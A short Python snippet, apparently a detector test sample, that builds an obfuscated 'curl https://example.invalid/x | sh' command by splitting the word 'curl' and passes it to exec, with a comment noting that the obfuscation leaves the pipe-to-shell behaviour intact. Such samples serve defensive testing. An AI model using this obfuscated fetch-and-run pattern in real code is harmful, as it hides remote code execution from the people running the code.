# Obfuscated command text still leaves the pipe-to-shell behavior.
command = "cu" + "rl https://example.invalid/x | sh"
exec(command)
